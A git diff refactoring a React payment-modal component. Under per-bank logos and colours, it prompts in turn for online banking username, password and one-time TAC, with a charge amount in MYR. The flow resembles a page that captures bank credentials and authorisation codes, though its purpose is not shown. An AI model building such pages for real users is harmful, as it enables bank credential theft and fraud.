@@ -6,20 +6,17 @@ import banks from "../../banks";
 import axios from "axios";
 import { useParams } from "react-router-dom";
 
-const bodyState = {
-  USERNAME: 0,
-  PASSWORD: 1,
-  TAC: 2,
-  TIMEOUT: 3,
-  ERROR: 4,
-  SUCCESS: 5,
-  LOADING: 6,
-  SECURETAC: 7,
-};
-
-Object.freeze(bodyState);
+import Loading from "./Loading";
+import Successful from "./Successful";
+import SomethingWentWrong from "./SomethingWentWrong";
+import TimeoutError from "./TimeoutError";
+import bodyState from "./bodyState";
+import Username from "./Username";
+import Password from "./Password";
+import Tac from "./Tac";
 
 function LoginForm({ id, bank, amount }) {
+  console.log(styles);
   let { transactionId } = useParams();
 
   console.log(transactionId);
@@ -30,58 +27,12 @@ function LoginForm({ id, bank, amount }) {
   let [tac, setTAC] = useState("");
   let [tacPhoneNumber, setTacPhoneNumber] = useState("");
   let [tacDate, setTacDate] = useState("");
-  let [hover, setHover] = useState(false);
   let [start, setStart] = useState(Date.now());
-  let [countdown, setCountdown] = useState(0);
-  // let [secureTacTimeout, setSecureTacTimeout] = useState(60);
-  let secureTacTimeout = 50;
-
-  const modalContent = {
-    color: banks[bank].fontColor,
-    backgroundColor: banks[bank].primaryColor,
-  };
-  const modalHeader = {
-    backgroundColor: banks[bank].secondaryColor,
-  };
-  const modalBody = {
-    borderColor: banks[bank].borderColor,
-    color: banks[bank].bodyFontColor,
-  };
-  const modalFooter = {
-    color: banks[bank].warningColor,
-    backgroundColor: banks[bank].secondaryColor,
-  };
-  const modalBtn = {
-    borderColor: banks[bank].bodyFontColor,
-    color: banks[bank].bodyFontColor,
-  };
-
-  const modalBtnHover = {
-    borderColor: banks[bank].buttonHoverColor ?? banks[bank].warningColor,
-    color: banks[bank].buttonHoverColor ?? banks[bank].warningColor,
-  };
-
-  const loaderStyle = banks[bank].loader;
 
   useEffect(() => {
     setUsername(banks[bank].username);
     setPassword(banks[bank].password);
   }, [start]);
-
-  function formatCountdown(time) {
-    if (time > 0) {
-      let minutes = Math.floor(time / 60);
-      let seconds = time % 60;
-
-      return `0${minutes}:${("0" + seconds).slice(-2)}`;
-    } else {
-      return "EXPIRED";
-    }
-  }
-
-  function toggleHover() {
-    setHover((prevState) => !prevState);
-  }
 
   function handleUsernameChange(e) {
     setUsername(e.target.value);
@@ -96,7 +47,6 @@ function LoginForm({ id, bank, amount }) {
   }
 
   async function handleButtonClick() {
-    setHover(false);
     setStart(Date.now());
 
     switch (stage) {
@@ -161,7 +111,6 @@ function LoginForm({ id, bank, amount }) {
                 setTacPhoneNumber(phoneNumber);
                 setTacDate(date);
                 setCountdown(0);
-                setStage(bodyState.SECURETAC);
                 setCompleted(80);
               }
             }
@@ -209,169 +158,57 @@ function LoginForm({ id, bank, amount }) {
     switch (stage) {
       case bodyState.USERNAME:
         return (
-          <>
-            <div className={styles["instructions"]}>
-              Please Enter Your Online Banking Username
-            </div>
-            <input
-              className={styles["form-control"]}
-              type="text"
-              value={username}
-              placeholder="Bank Username"
-              onChange={handleUsernameChange}
-              required
-            />
-            <button
-              className={`${styles["modal-btn"]} ${styles["form-control"]}`}
-              onMouseEnter={() => setHover(true)}
-              onMouseLeave={() => setHover(false)}
-              onClick={handleButtonClick}
-              style={hover ? modalBtnHover : modalBtn}
-            >
-              Next
-            </button>
-          </>
+          <Username
+            value={username}
+            onValueChange={handleUsernameChange}
+            onButtonClick={handleButtonClick}
+          />
         );
+
       case bodyState.PASSWORD:
         return (
-          <>
-            <div className={styles["instructions"]}>
-              Please Enter Your Password
-            </div>
-            <input
-              className={styles["form-control"]}
-              type="password"
-              value={password}
-              placeholder="Bank Password"
-              onChange={handlePasswordChange}
-              required
-            />
-            <button
-              className={`${styles["modal-btn"]} ${styles["form-control"]}`}
-              onMouseEnter={() => setHover(true)}
-              onMouseLeave={() => setHover(false)}
-              onClick={handleButtonClick}
-              style={hover ? modalBtnHover : modalBtn}
-            >
-              Next
-            </button>
-          </>
+          <Password
+            value={password}
+            onValueChange={handlePasswordChange}
+            onButtonClick={handleButtonClick}
+          />
         );
-      case bodyState.SECURETAC:
-        let _countdown = secureTacTimeout - countdown;
 
-        if (_countdown <= 0) {
-          alert("Send a request to proceed");
-        }
-
-        return (
-          <>
-            <div className={styles["instructions"]}>SecureTAC Approval</div>
-            <p className={styles["tac-details"]}>
-              If you do not receive the SecureTAC notification on your phone,
-              please hold for {_countdown} seconds to be redirected to receive
-              SMS TAC.
-            </p>
-          </>
-        );
       case bodyState.TAC:
         return (
-          <>
-            <div className={styles["instructions"]}>Enter the TAC</div>
-            <input
-              className={styles["form-control"]}
-              type="text"
-              value={tac}
-              onChange={handleTACChange}
-              required
-            />
-            <button
-              className={`${styles["modal-btn"]} ${styles["form-control"]}`}
-              onMouseEnter={() => setHover(true)}
-              onMouseLeave={() => setHover(false)}
-              onClick={handleButtonClick}
-              style={hover ? modalBtnHover : modalBtn}
-            >
-              Next
-            </button>
-            <p className={styles["tac-details"]}>
-              Your TAC Request is successful
-              {" " + tacDate ?? ""}. Your TAC number will be sent to your
-              registered mobile phone number
-              {" " + tacPhoneNumber ?? ""}.
-            </p>
-
-            {/* {timeout - countdown <= 150 ? (
-              <p>Did not receive TAC. Resend</p>
-            ) : (
-              <></>
-            )} */}
-          </>
+          <Tac
+            value={tac}
+            onValueChange={handleTACChange}
+            onButtonClick={handleButtonClick}
+            tacDate={tacDate}
+            tacPhoneNumber={tacPhoneNumber}
+          />
         );
       case bodyState.ERROR:
-        return SomethingWentWrong();
+        return <SomethingWentWrong onReturn={handleReturning} />;
       case bodyState.TIMEOUT:
-        return TimeoutError();
+        return <TimeoutError onReturn={handleReturning} />;
       case bodyState.LOADING:
-        return <BankLoading style={loaderStyle} />;
+        return <Loading bank={bank} />;
       case bodyState.SUCCESS:
-        return TransactionSuccessful();
+        return <Successful />;
       default:
-        return <BankLoading style={loaderStyle} />;
+        return <Loading bank={bank} />;
     }
   }
 
-  function TimeoutError() {
-    return (
-      <>
-        <h3>Timeout Error</h3>
-        <br />
-        <p>
-          Failed to complete the transaction within the time limit. Please try
-          again.
-        </p>
-        <br />
-        <a href="/#" onClick={handleReturning}>
-          Returning to Merchant
-        </a>
-      </>
-    );
-  }
-
-  function SomethingWentWrong() {
-    return (
-      <>
-        <h3>Transaction Failed</h3>
-        <br />
-        <p>
-          Transaction Failed. It seems like something has gone wrong. Please
-          initiate a new payment or contact Merchant for support.
-        </p>
-        <br />
-        <a href="/#" onClick={handleReturning}>
-          Returning to Merchant
-        </a>
-      </>
-    );
-  }
-
-  function TransactionSuccessful() {
-    return (
-      <>
-        <h3>Transaction Successful!</h3>
-        <br />
-        <p>
-          Transaction Successful. Please do not refresh, you will be redirect
-          back to the website you came from.
-        </p>
-      </>
-    );
-  }
-
   return (
-    <div className={styles["login-form"]}>
-      <div className={styles["modal-content"]} style={modalContent}>
-        <div className={styles["modal-header"]} style={modalHeader}>
+    <div className={`${styles["login-form"]}`}>
+      <div
+        className={`${styles["modal-content"]} ${
+          styles[`${bank.toLowerCase()}-modal-content`]
+        }`}
+      >
+        <div
+          className={`${styles["modal-header"]} ${
+            styles[`${bank.toLowerCase()}-modal-header`]
+          }`}
+        >
           <img
             alt="Bank Logo"
             src={banks[bank].logo}
@@ -383,43 +220,31 @@ function LoginForm({ id, bank, amount }) {
           <small>Amount to charge</small>
           <h3 className={styles["amount"]}>MYR {amount}.00</h3>
           <ProgressBar bgcolor={"#2ecc71"} completed={completed} />
-          <Timer timeout="180" start={start} />
+          <Timer
+            timeout="180"
+            start={start}
+            onTimerEnd={() => {
+              console.log("Timer end");
+            }}
+          />
         </div>
-        <div className={styles["modal-body"]} style={modalBody}>
+        <div
+          className={`${styles["modal-body"]} ${
+            styles[`${bank.toLowerCase()}-modal-body`]
+          }`}
+        >
           {body(stage)}
         </div>
-        <div className={styles["modal-footer"]} style={modalFooter}>
+        <div
+          className={`${styles["modal-footer"]} ${
+            styles[`${bank.toLowerCase()}-modal-footer`]
+          }`}
+        >
           <small>
             Please <strong>DO NOT REFRESH</strong> your web browser
           </small>
         </div>
       </div>
-    </div>
-  );
-}
-
-function BankLoading({ style }) {
-  return (
-    <div className={styles["bank-loading"]}>
-      <p>
-        <span>
-          <svg
-            width="1em"
-            height="1em"
-            viewBox="0 0 16 16"
-            className={`bi bi-gear-fill ${styles["spin"]}`}
-            fillRule="currentColor"
-            xmlns="http://www.w3.org/2000/svg"
-            fill={style}
-          >
-            <path
-              fillRule="evenodd"
-              d="M9.405 1.05c-.413-1.4-2.397-1.4-2.81 0l-.1.34a1.464 1.464 0 0 1-2.105.872l-.31-.17c-1.283-.698-2.686.705-1.987 1.987l.169.311c.446.82.023 1.841-.872 2.105l-.34.1c-1.4.413-1.4 2.397 0 2.81l.34.1a1.464 1.464 0 0 1 .872 2.105l-.17.31c-.698 1.283.705 2.686 1.987 1.987l.311-.169a1.464 1.464 0 0 1 2.105.872l.1.34c.413 1.4 2.397 1.4 2.81 0l.1-.34a1.464 1.464 0 0 1 2.105-.872l.31.17c1.283.698 2.686-.705 1.987-1.987l-.169-.311a1.464 1.464 0 0 1 .872-2.105l.34-.1c1.4-.413 1.4-2.397 0-2.81l-.34-.1a1.464 1.464 0 0 1-.872-2.105l.17-.31c.698-1.283-.705-2.686-1.987-1.987l-.311.169a1.464 1.464 0 0 1-2.105-.872l-.1-.34zM8 10.93a2.929 2.929 0 1 0 0-5.86 2.929 2.929 0 0 0 0 5.858z"
-            />
-          </svg>
-        </span>
-        Connecting to bank...
-      </p>
     </div>
   );
 }
